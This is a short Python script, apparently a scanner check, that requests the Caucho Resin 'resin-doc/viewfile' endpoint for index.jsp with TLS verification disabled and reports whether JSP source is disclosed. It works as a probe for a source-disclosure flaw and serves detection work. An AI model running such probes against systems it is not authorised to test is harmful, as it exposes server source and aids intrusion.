import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def doCheck(baseurl):
	if baseurl[-1]=='/':
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"resin-doc/viewfile/?file=index.jsp"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and "%@ page session=\"false\" import=\"com.caucho.vfs.*, com.caucho.server.webapp.*\" %" in response.text:
		r0=True
	else:
		r0=False
	if r0:
		return True
	else:
		return False
